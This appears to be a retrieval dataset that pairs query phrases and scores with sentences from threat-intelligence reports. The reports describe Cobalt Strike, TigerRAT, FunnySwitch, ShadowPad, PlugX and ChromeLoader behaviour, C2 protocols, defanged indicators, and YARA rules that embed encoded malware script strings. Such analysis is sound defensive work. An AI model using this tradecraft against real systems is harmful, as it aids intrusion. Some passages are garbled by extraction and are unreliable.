the malware executes a command to delete itself from the system|0.8158895172335485|"[""Stage 4 downloader executable The downloader is a 64-bit executable that runs as a process in the victim's environment."", 'It executes the PowerShell command, which downloads the Cobalt Strike payload DLL through the URL ""https[://]bitbucket[.', ']org/clouchfair/oneproject/downloads/strymon.png"" to the userprofile local application temporary directory with a spoofed extension .png and sideloads the DLL using rundll32.exe.', 'Stage 4 downloader EXE.', 'The downloader also executes the ping command to the IP address 1[.]1[.]1[.', ']1 and executes the delete command to delete itself.', 'The usage of ping command is to instill a delay before deleting the downloader.', 'Payload Talos discovered that the final payload of this campaign is a Cobalt Strike beacon.', 'Cobalt Strike is a modularised attack framework and is customizable.', 'Threat actors can add or remove features according to their malicious intentions.', ""Employing Cobalt Strike beacons in the attacks' infection chain allows the attackers to blend their malicious traffic with legitimate traffic and evade network detections.""]"
delete key files|0.8511498282379515|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
Application-level protocol|0.756573856459307|['This type of DDoS is famous for its two stages of infecting hosts and creating botnet of zombies who pretend to be a well defended endpoint and the attack phase that has been seen to take from minutes to over multiple days.', 'The vector varies from network type attacks to application layer attacks235.', 'Encrypted Attacks.', 'The rise of using encrypted services and traffic (SSL) on the web has attracted different levels of DDoS attacks.', 'This includes attacks on the application level (flood attacks, bruteforce etc.', '), network level and the protocol level (i.e.', 'SSL renegotiation or downgrade) making it harder for defenders and toolsets to recognise malicious traffic from legitimate236.', '3.5.5 Specific attack vectors According to Nexusgaurd Q2 2018 report, most of the attacks were focused on hit-run tactics and specifically during peak times to strike their targets with UDP, TCP (SYN) and ICMP floods being the top 3 vectors.', 'The duration of these malicious attempts were mostly recorded as lasting less than 90 minutes and the longest to more than 6 days.', '234https://www.ipexpoeurope.com/content/download/13783/181390/file/NETSCOUT_ThreatReport_FINAL_080618 b.pdf, accessed November 2018.', '235 https://www.hindawi.com/journals/scn/2018/5353060/, accessed November 2018.']
the opening of a URL file extracted from the archive.|0.7638391591171408|['Comparing command lines in the covid-19 and Zeplin shortcuts The mechanism for initial infection is fundamentally the same: trying to open either of the shortcuts leads to running a command that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder.', 'Further actions are performed with the help of an extracted JS script.', 'Figure 2.', 'Contents of script 34fDFkfSD32.js But here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\\\\Users\\\\Public\\\\Downloads, achieves persistence by adding itself to the startup folder and adding a scheduler task, and runs the payload.', 'The script also sends the output of ipconfig in a POST request to http://zeplin.atwebpages[.]com/inter.php.', 'The command run by the shortcut also contains the opening of a URL file extracted from the archive.', 'The name of the URL file and the target address depend on which shortcut is opened: 1/41Conversations - iOS - Swipe Icons - Zeplin.url goes to: https://app.zeplin.io/project/5b5741802f3131c3a63057a4/screen/5b589f697e44cee37e0e61df Tokbox icon - Odds and Ends - iOS - Zeplin.url goes to: https://app.zeplin.io/project/5c161c03fde4d550a251e20a/screen/5cef98986801a41be35122bb.', 'This is the only difference between the two LNK files.', 'In both cases, the target page is hosted on Zeplin, a legitimate service for collaboration between designers and developers, and requires logging in to view.', 'The payload consists of two files: svchast.exe It functions as a simple local shellcode loader.', 'The shellcode read from a fixed path.']
a GET request is sent to the C2 server.|0.8088299663296873|['Four protocols are supported: 1.', 'Standard TCP connection Application-level messages are sent unchanged as TCP segments.', '6/412.', 'Equivalent to HTTP Long Polling The client creates two TCP connections.', 'The first will be used to get packets from the server, and the second to send them.', 'During the first connection, a GET request is sent to the C2 server.', 'The server replies with headers with code 200 and Content- Length: 524288000.', 'The subsequent stream of application-level messages from the server to the client is sent as the body of an HTTP response.', 'Figure 10.', 'First HTTP connection with C2 After the correct response headers are received, the malware establishes a second connection to the same port, where a POST request is made.', 'The header dCy is generated by the client based on the UUID and, it would seem, serves as the session ID that links the two connections.']
a GET request is sent to the C2 server.|0.7821734878932076|"['C2 communication For C2 communication, first, the trojan sends the victim\'s computer name, user name, a separator ""ZxxZ"" and the Windows version pulled from the registry.', 'The server responds back with data in the format <id><user>:""<Program name"">.', 'Next, the malware requests the program data.', 'The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>.', 'It then saves the file to %LOCALAPPDATA%\\\\Debug\\\\<program name>.exe and tries to execute it.', 'Request sent to C2.', 'If the download is successful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response.', 'Based on our analysis, the opdoce DN-S means ""download successful"" and RN_E stands for run error.', 'If failed, the malware attempts to download the program data 225 times, and after that, it will launch itself and exit.', 'Conclusion https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html 16/205/19/22, 12:15 PM Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Bitter APT adds Bangladesh to their targets Organizations should be vigilant about the highly motivated threat actors who are known to conduct targeted attacks in their region.', 'Threat actors usually emerge with smart techniques to accomplish their adversarial objectives and we have seen such an attempt in this campaign with the addition of a new variant to their arsenal.']"
a GET request is sent to the C2 server.|0.7821734878932076|"['C2 communication For C2 communication, first, the trojan sends the victim\'s computer name, user name, a separator ""ZxxZ"" and the Windows version pulled from the registry.', 'The server responds back with data in the format <id> <user>:""<Program name"">.', 'Next, the malware requests the program data.', 'The server sends back the data of the Portable Executable effectively matching the pattern:<zero or more bytes>ZxxZ<PE data minus the MZ>.', 'It then saves the file to %LOCALAPPDATA%\\\\Debug\\\\<program name>.exe and tries to execute it.', 'Request sent to C2.', 'If the download is successful, the server sends back the request with the opcode DN-S and, in case of a failure, the opcode RN_E in their response.', 'Based on our analysis, the opdoce DN-S means ""download successful"" and RN_E stands for run error.', 'If failed, the malware attempts to download the program data 225 times, and after that, it will launch itself and exit.', 'Conclusion Organizations should be vigilant about the highly motivated threat actors who are known to conduct targeted attacks in their region.', 'Threat actors usually emerge with smart techniques to accomplish their 15/19adversarial objectives and we have seen such an attempt in this campaign with the addition of a new variant to their arsenal.']"
same IP address was used as C2 server|0.9916766350749799|"['10/41The file  .exe (""Electronic reader resume.exe"") is an executable self-contained loader for PL shellcode.', 'It contains Cobalt Strike Beacon as the payload.', 'Figure 21.', 'Configuration of Cobalt Strike Beacon The archive was distributed on approximately June 1, 2020, from the IP address 66.42.48[.', ']186 and was available at hxxp://66.42.48[.]186:65500/electronic_resume.pdf.rar.', 'The same IP address was used as C2 server.', 'The modification time of the archive files, as well as the date on which the archive was found the server, point to the attack being active in late May or early June.', 'The Russian filenames suggest that the targets were Russian-speaking users.', ""2.3.2 I can't breathe The attack is practically identical to the previous one: malware is distributed in a RAR archive video.rar (fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc) and consists of two .exe files."", 'The archive is available on June 1 on the same server at the address hxxp://66.42.48[.]186:65500/video.rar.', 'Figure 22.']"
HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server.|1.0000000000000002|"['Password is the key used to encrypt messages.', 'ID identifies the relay (if not present in the configuration, the GUID is used instead).', 'StartTime, EndTime, and WeekDays restrict the times and days when the backdoor may function The <Config> element may contain an arbitrary number of elements describing various types of connectors: TcpConnector and TcpBindConnector are classes responsible for connecting over TCP as client and server.', 'They have two parameters in common: address and port (by default, 38001).', 'TcpConnector also has the parameter interval, which indicates how long to wait before trying to reconnect.', 'HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server.', 'Supported client parameters: url address to connect to, interval same as at TcpConnector, proxy and cred proxy server address and credentials.', 'Server parameters: url list of prefixes on which it will run and timeout client timeout.', 'The standard classes HttpWebRequest and HttpListener from .NET Framework are used for client and server implementations.', 'Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.MachineName + "".local.domain"".', 'The client, in turn, ignores certificate validation.']"
connect by sending a GET request to a URL from the configuration and provide a special cookie value|0.8108404185218069|"['The backdoor uses this encryption method in other cases as well, which is why we refer to it as ""standard"" in the text that follows.', 'The key string in this case is ""tcp_encrypted"".', 'Figure 41.', 'Standard encryption in FunnySwitch 21/412.', 'HTTP with long polling There are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".', 'To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.', 'The cookie name is eight random characters.', 'The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").', 'The string is encrypted in the standard way with the key ""http"".', 'The client then constantly sends GET requests with pull operations.', 'In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.']"
sends GET requests with pull operations.|0.8233588415740914|"['HTTP with long polling There are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".', 'To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.', 'The cookie name is eight random characters.', 'The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").', 'The string is encrypted in the standard way with the key ""http"".', 'The client then constantly sends GET requests with pull operations.', 'In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.', 'Clientserver messages are periodically sent as an array as well, for which a POST request with push operation is used.', 'Figure 42.', 'FunnySwitch connect and pull requests The special class MsgPack class, which implements a custom serialization protocol, unpacks the array and other primitive types.', '3.']"
archive|1.0|['Services display sensitive content.', 'for your needs.', 'such as Archive.org and Archive.Today aim to preserve all websites, which can Add the following to a robots.txt I am NAME owner of DOMAIN.', 'be an unwelcome feature for those who file on your site.', 'Im officially requesting the immediate removal of my site wish to erase their past.', 'Fortunately we (Create a new file if one is not from all archive.org products.', 'still have some privacy powers which already present.)', 'The User-agent: archive.org_ can be executed to remove undesired bot Disallow: / code present content associated with the domains User-agent: archive.org_bot in our robots.txt file is not which we own.', 'being honored.', 'It can be seen Disallow: / at: Archive.org Removal Create a file called verify.txt at the https://DOMAIN/robots.txt If your website(s) appear on Archive.', 'root of your site.']
archive|0.7900310213783048|['DMCA Notice: with the following.', 'DMCA Notice: I am the site owner and sole User-agent: archive.org_bot copyright holder for each of I am the site owner and sole Disallow: / the domains cited above.', 'This copyright holder for each of letter is official notifica- the domains cited above.', 'This Modify your .htaccess file to include tion under Section 512(c) of letter is official notifica- the Digital Millennium Copy- the following.', 'tion under Section 512(c) of right Act (DMCA), and I seek the Digital Millennium Copy- RewriteEngine On the removal of the aforemen- right Act (DMCA), and I seek tioned infringing material the removal of the aforemen- RewriteCond %{HTTP_USER_AGENT} from your servers.', 'Archive.', 'tioned infringing material (archive.org_bot) [NC] org does not have any right from your servers.', 'Archive.', 'or permission to reproduce, RewriteRule .', '* - [R=403,L] Today does not have any right sell or display my websites in or permission to reproduce, any way, shape or form.', 'I am If using Cloudflare, add the sell or display my websites in providing this notice in good following to a WAF rule.']
archive|0.8700853416313215|"['(MITRE D3FEND techniqueD3-EDL).URL Analysis:ChromeLoader often lingers as a Trojanised downloadable to begin its infection.', 'Deterring users from visiting malicious URLs can prevent the initial infection.', '(MITRE D3FEND techniqueD3-UA)YARA Rule for ChromeLoader MalwareThe following YARA rule was authored by the BlackBerry Research & Intelligence Team to catch the threat described in this document:import ""pe""import ""hash""rule ChromeLoader_V1{meta:description = ""ChromeLoader Malware Variant1""author = ""BlackBerry Threat Research team""created_from_sha256 = ""ded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd""confidence = ""1""strings:$f1 = ""JABlAHgAdABQAGEAdABoACAAPQAgACIAJAAoACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQApAFwAYwBoAHIAbwBtAGUAIgAKACQAYwBvAG4AZgBQAGEAdABoACAAPQAgACIAJABlAHgAdABQAGEAdABoAFwAYwBvAG4AZgAuAGoAcwAiAAoAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIAA9ACAAIgAkACgAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACkAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAIgAKACQAdABhAHMAawBOAGEAbQBlACAAPQAgACIAQwBoAHIAbwBtAGUATABvAGEAZABlAHIAIgAKACQAZABvAG0AYQBpAG4AIAA9ACAAIgBiAHIAbwBrAGUAbgBuAGEALgB3AG8AcgBrACIACgAKACQAaQBzAE8AcABlAG4AIAA9ACAAMAAKACQAZABkACAAPQAgADAACgAkAHYAZQByACAAPQAgADAACgAKACgARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAHQAZQByACAAIgBuAGEAbQBlAD0AJwBjAGgAcgBvAG0AZQAuAGUAeABlACcAIgApACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAKAAkAaQBmACgAJABfACAALQBNAGEAdABjAGgAIAAiAGwAbwBhAGQALQBlAHgAdABlAG4AcwBpAG8AbgAiACkAewAKAAkACQBiAHIAZQBhAGsACgAJAH0ACgAKAAkAJABpAHMATwBwAGUAbgAgAD0AIAAxAAoAfQAKAAoAaQBmACgAJABpAHMATwBwAGUAbgApAHsA"" wide$f2 = ""Install Error, incompatible system"" wide$f3 = ""ChromeLoader"" wide$f4 = ""CS_installer"" ascii wide$f5 = ""CS_installer.exe"" ascii$f6 = ""Z:\\\\\\\\bundle_installer\\\\\\\\CS_installer\\\\\\\\obj\\\\\\\\Release\\\\\\\\net48\\\\\\\\win7-x86\\\\\\\\CS_installer.pdb"" ascii$f7 = ""_meta.txt"" wide$f8 = ""Error, incompatible OS"" wide$f9 = ""ChromeTask"" ascii wide$f10 = ""ChromeMonitor"" widecondition:5 of ($f*) andpe.is_32bit() andfilesize < 90KB andpe.imports(""mscoree.dll"", ""_CorExeMain"") andpe.imphash() == ""f34d5f2d4577ed6d9ceec516c1f5a744"" andpe.number_of_sections == 3}import ""pe""import ""hash""rule ChromeLoader_V2{meta:description = ""ChromeLoader Malware Variant2""author = BlackBerry Threat Research team""created_from_sha256 = ""00c07e354014c3fb21d932627c2d7f77bf9b4aeb9be6efb026afdbd0368c4b29""confidence = ""1""strings:$f1 = ""Prime tech"" wide$f2 = ""Energy App"" wide$f3 = ""Chrome Sandbox"" wide$f4 = ""Tone ltd"" wide$f5 = ""Tone.exe app"" wide$f6 = ""ToneApp"" wide$f7 = ""metadata"" wide$f8 = ""Energy ltd"" wide$f9 = ""Energy.exe Software"" wide$f10 = ""Chrome_MessageWindow"" wide$f11 = ""Prime app"" wide$f12 = ""PrimeApplication"" wide$f13 = ""Chrome_MessageWindow"" wide$f14 = ""Energy Tech"" nocase wide$f15 = ""Energy Application"" wide$f16 = ""Energy.exe App"" wide$f17 = ""Bloom Technologies"" wide$f18 = ""Bloom.exe app"" wide$f19 = ""Bloom"" wide$f20 = ""nw.exe.pdb"" ascii$f21 = ""nw_elf.dll"" ascii$f22 = ""encrypt"" wide$f23 = ""TripleDES"" wide$f24 = ""./script.js"" widecondition:7 of ($f*) andfilesize < 150MB andpe.number_of_imports == 3 andpe.imphash() == ""d75a6917dd41b6164f0b6788ef978211"" andpe.number_of_sections == 12}Indicators of Compromise (IoCs)Domain/IP/URLRelevant Informationithconsukultin[.', ']comRegistered to DANESCO TRADING LTD on 2021-12-13hxxps[://]tobepartou[.', ']com/Registered to DANESCO TRADING LTD on 2021-12-13hxxps[://]ithconsukultin[.', ']com /archive[.', ']zip?iver=$iverFile containing C2 information172[.]67[.]198[.', ']47Malicious Chrome extensionPDB Pathsnw.exe.pdbelectron.exe.pdbBlackBerry AssistanceIf youre battling this malware or a similar threat, youve come to the right place, regardless of your existing BlackBerry relationship.The BlackBerry Incident Response teamis made up of world-class consultants dedicated to handling response and containment services for a wide range of incidents, including ransomware and Advanced Persistent Threat (APT) cases.We have a global consulting team standing by to assist you, providing around-the-clock support where required, as well as local assistance.', 'Please contact us here:https://www.blackberry.com/us/en/forms/cylance/handraiser/emergency-incident-response-containmentRelated Reading:About The BlackBerry Research and Intelligence TeamTheBlackBerry Research and Intelligence teamis a highly experienced threat research group specializing in a wide range of cybersecurity disciplines, conducting continuous threat hunting to provide comprehensive insights into emerging threats.', ""We analyze and address various attack vectors, leveraging our deep expertise in the cyberthreat landscape to develop proactive strategies that safeguard against adversaries.Whether it's identifying new vulnerabilities or staying ahead of sophisticated attack tactics, we are dedicated to securing your digital assets with cutting-edge research and innovative solutions.""]"
AES-128-CBC for encryption.|0.8169265195102822|"[', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  ."", 'MASEPIE - ,   Python.', '/  .', 'TCP.', ""AES-128-CBC; ,  16 ,   '."", '\'SysUpdate\'  ""Run"" , ,  LNK- \'SystemUpdate.lnk\'  .', 'STEELHOOK - PowerShell-,   - (""Login Data"", ""Local State"") - DPAPI     HTTP POST- base64- .', ': 9724cecaa8ca38041ee9f2a42cc5a297 4fa8caea8002cd2247c2d5fd15d4e76762a0f0cdb7a3c9de5b7f4d6b2ab34ec6 2.txt 5f126b2279648d849e622e4be910b96c 6bae493b244a94fd3b268ff0feb1cd1fbc7860ecf71b1053bf43eea88e578be9 2.ps1 (STEELHOOK) 47f4b4d8f95a7e842691120c66309d5b 18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6 Client.py (MASEPIE) 8d1b91e8fb68e227f1933cfab99218a4 6d44532b1157ddc2e1f41df178ea9cbc896c19f79e78b3014073af2d8d9504fe VMSearch.sfx.exe 6fdd416a768d04a1af1f28ecaa29191b fb2c0355b5c3adc9636551b3fd9a861f4b253a212507df0e346287110233dc23 VMSearch.exe 1/5(OCEANMAP) 5db75e816b4cef5cc457f0c9e3fc4100 24fd571600dcc00bf2bb8577c7e4fd67275f7d19d852b909395bebcbb1274e04 VMSearch.exe (OCEANMAP) 6128d9bf34978d2dc7c0a2d463d1bcdd 19d0c55ac466e4188c4370e204808ca0bc02bba480ec641da8190cb8aee92bdc KFP.311.152.2023.pdf .lnk 825a12e2377dd694bbb667f862d60c43 593583b312bf48b7748f4372e6f4a560fd38e969399cf2a96798e2594a517bf4 KFP.311.152.2023.pdf.lnk acd9fc44001da67f1a3592850ec09cb7 c22868930c02f2d6962167198fde0d3cda78ac18af506b57f1ca25ca5c39c50d .pdf .lnk : \\\\\\\\194[.']"
use AES-128 in CFB mode as the encryption algorithm|0.9765863293458493|['Figure 17.', 'Handling of PL shellcode in the loader body (ChaCha20) The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.', 'We can also find key information here in the structure of the PL shellcode: at offset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key.', '9/41Figure 18.', 'Handling of PL shellcode in the loader body (AES-128) Older loader versions use Cryptography API: Next Generation (BCrypt* functions) in an equivalent way.', 'They use AES-128 in CFB mode as the encryption algorithm.', 'The loaders that rely on external files have a similar code structure and one of two encryption types: ChaCha20 or AES-128-CBC.', 'The file should contain PL shellcode of the same format as in the self-contained loader.', 'The name depends on the specific sample and is encrypted with the algorithm used in it.', 'It can contain a full file path (although we did not detect any such samples) or a relative path.', 'Figure 19.']
a RAR archive|0.7674154769417207|['Thursday, September 8, 2022 By: Counter Threat Unit Research Team In June and July 2022, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government officials of several countries in Europe, the Middle East, and South America.', 'PlugX is modular malware that contacts a command and control (C2) server for tasking and can download additional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shellcode in executable file headers, and politically-themed decoy documents that align with regions where China has interests.', 'The malware is embedded within RAR archive files.', 'Opening the archive on a Windows computer with default settings displays a Windows shortcut (LNK) file (see Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hidden folder that contains the malware, embedded eight levels deep in a sequence of hidden folders named with special characters (see Figure 2).', 'This tiering is likely to bypass mail-scanning products that may not traverse the entire path when scanning content, suggesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', '1/11Figure 2.', 'Malicious files contained within hidden folder.']
a RAR archive|0.7674154769417207|"['Thursday, September 8, 2022 By: Counter Threat Unit Research Team In June and July 2022, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government officials of several countries in Europe, the Middle East, and South America.', 'PlugX is modular malware that contacts a command and control (C2) server for tasking and can download additional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shellcode in executable file headers, and politically-themed decoy documents that align with regions where China has interests.', 'The malware is embedded within RAR archive files.', 'Opening the archive on a Windows computer with default settings displays a Windows shortcut (LNK) file (see Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hidden folder that contains the malware, embedded eight levels deep in a sequence of hidden folders named with special characters (see Figure 2).', 'This tiering is likely to bypass mail-scanning products that may not traverse the entire path when scanning content, suggesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', 'https://www.secureworks.com/blog/bronze-president-targets-government-officials 1/1512/7/22, 9:27 AM BRONZE PRESIDENT Targets Government Officials | Secureworks Figure 2.', 'Malicious files contained within hidden folder.']"
encrypted header|0.7805902685231376|['purposes, and perhaps for this reason, the one year registrationwasnotrenewed by theattacker.', 'Despite BYTE SIZE (BYTES) DESCRIPTION* POSITION this, anumberof victims aroundtheworld continued 0 4 LURK protocol identifier.', 'to usethedomainto locatetheirC2 server, resulting Hexadecimalbytes 0x4C 0x550x52 in attempted communications to a C2 server that no 0x4B (orLURKinASCII representation).', 'longerexists.', '4 1 Hexadecimalbyte0x30(0)inall observedsamples.Bytemayform THEVICTIMS partoftheprotocol identifier.', 'Computers using IP addresses allocated to France, 5 4 SizecCompressedmessagesizein bytes (includingheader).', 'thePeoplesRepublicof China, Portugal, SouthKorea, 9 4 Decompressed datasizeinbytes.', 'Taiwan, the United Kingdom and the United States 13 2 ZLIB6streamheader.Hexadecimal areamong thosethat attempted to communicatewith bytes 0x780x9c7inallobserved alyac.org subdomains after the attackers communications,denoting thatthe DEFLATEcompressionmethod was registrationlapsedinSeptember2011.', 'used tocompressthedata(witha window sizeof32K).', 'While some of these computers belong to 15 [Sizec15] DEFLATEcompressed data.', 'security researchers who deliberately installed *ALL VALUES ARE LITTLEENDIAN UNLESS OTHERWISE STATED.']
encrypted Base64 string containing the session GUID|0.8058348158457114|"['Figure 41.', 'Standard encryption in FunnySwitch 21/412.', 'HTTP with long polling There are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".', 'To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.', 'The cookie name is eight random characters.', 'The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").', 'The string is encrypted in the standard way with the key ""http"".', 'The client then constantly sends GET requests with pull operations.', 'In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.', 'Clientserver messages are periodically sent as an array as well, for which a POST request with push operation is used.', 'Figure 42.']"
encrypted Base64 string containing the session GUID|0.8058348158457114|"['Incoming messages with an invalid signature are discarded.The header contains the data size (4 bytes) and byte indicating the message type (0x1, 0x2, or 0x3).It is encrypted with AES-256-CBC; the key and IV are taken from the MD5 of the key string.', 'The backdoor uses this encryption method in other cases as well, which is why we refer to it as ""standard"" in the text that follows.', 'The key string in this case is ""tcp_encrypted"".Figure 41.', 'Standard encryption in FunnySwitchHTTP with long pollingThere are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".', 'To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.The cookie name is eight random characters.', 'The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").', 'The string is encrypted in the standard way with the key ""http"".The client then constantly sends GET requests with pull operations.', 'In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.', 'Clientserver messages are periodically sent as an array as well, for which a POST request with push operation is used.Figure 42.', 'FunnySwitch connect and pull requestsThe special class MsgPack class, which implements a custom serialization protocol, unpacks the array and other primitive types.RPC (Pipe)Similar to TCP, except for the absence of connection monitoring.5.2.2 Network-level protocolFigure 43.', 'Function for processing incoming network-level communicationsAll messages at this level are encrypted in the backdoor\'s standard way, with the key string ""commonkey"".Messages are an array of three or four elements:Message type (""hello_request"", ""hello_response"", ""message"", ""error"")Source serialized arrayDestination serialized arrayPayload (application-level data)TheMsgPackclass is also used for serialization.']"
compressed with GZip prior to encryption|0.9544456487309995|"['Messages of the ""message"" type (ones that are not hello_request, hello_response, or error) can be passed via several relays.', 'If its Destination field contains only the ID of the current instance, it will be handled locally; if not, it will be sent to the next relay in the list.', 'For connecting to the next instance, it uses the connector that was saved when exchanging hello_request and hello_response messages.', 'The backdoor collects the following system information: Values of the registry keys ProductName and CSDVersion from HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion Whether the OS is 32-bit or 64-bit List of IP addresses Computer name Username and workgroup Name of running module PID MAC addresses of network adapters Value of the Group attribute in the XML configuration 5.2.3 Application-level protocol 23/41At the application level, data is encrypted in the standard way using the value of the Password attribute from the configuration.', 'If no such value exists, the key string is ""test"".', 'Data is compressed with GZip prior to encryption.', 'After decryption and decompression, the payload is an array (packed MsgPack) consisting of one or two elements: a string with the name of a command and optional array of bytes (data for the command).', 'These elements, in turn, contain another serialized array, which contains a message string ID (which will be used to send the result of the command) plus the data for the command.', '5.2.4 Supported commands Command Description invoke Run JScript code and get the result.', 'Implementation was separated out into a JSCore .NET assembly, which is dynamically loaded from a Base64 constant defined in the main assembly.', 'Figure 44.']"
has been obfuscated with the same rel_jmp and fake-jb techniques|0.8837256803953867|"['After decryption, the file is deleted and the shellcode is re-encrypted, saved in the registry, and run.', 'When log.exe is launched subsequently, the shellcode will be loaded from the registry.', 'The data is stored in a hive with a name resembling the following: (HKLM|HKCU)\\\\Software\\\\Classes\\\\CLSID\\\\{%8.8x-%4.4x-%4.4x- %8.8x%8.8x}, in key %8.8X.', 'The values inserted in the formatting strings are generated based on the TimeDateStamp in the PE header of log.dll, and therefore are always identical for any given library copy.', 'In our case, they equal {56a36bd2-5e2b-20b0-96f2cb9bb3f43475} and EB5D1182, respectively.', 'The payload is ShadowPad shellcode that has been obfuscated with the same rel_jmp and fake-jb techniques.', 'The following strings are contained in its encrypted configuration: 28/416/30/2020 1:25:52 PM ccc %ProgramData%\\\\ msdn.exe log.dll log.dll.dat WMNetworkSvc WMNetworkSvc WMNetworkSvc SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run WMSVC %ProgramFiles%\\\\Windows Media Player\\\\wmplayer.exe %windir%\\\\system32\\\\svchost.exe %windir%\\\\system32\\\\winlogon.exe %windir%\\\\explorer.exe TCP://cigy2jft92.kasprsky.info:443 UDP://cigy2jft92.kasprsky.info:53 SOCKS4 SOCKS4 SOCKS5 SOCKS5 They include the likely data of module assembly (June 6, 2020), name of the service used by the malware to gain persistence on the system (WMNetworkSvc), names of processes into which shellcode can be injected, and the C2 domain cigy2jft92.kasprsky[.]info.', 'As we wrote earlier, the other domain kasprsky[.', ']info has been used by attackers as a FunnySwitch C2 server.', 'Investigation of subdomains and IP addresses yields another second-level domain, livehost[.', ']live, whose subdomain d89o0gm35t.livehost[.']"
SFX archive|0.7901650876178702|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
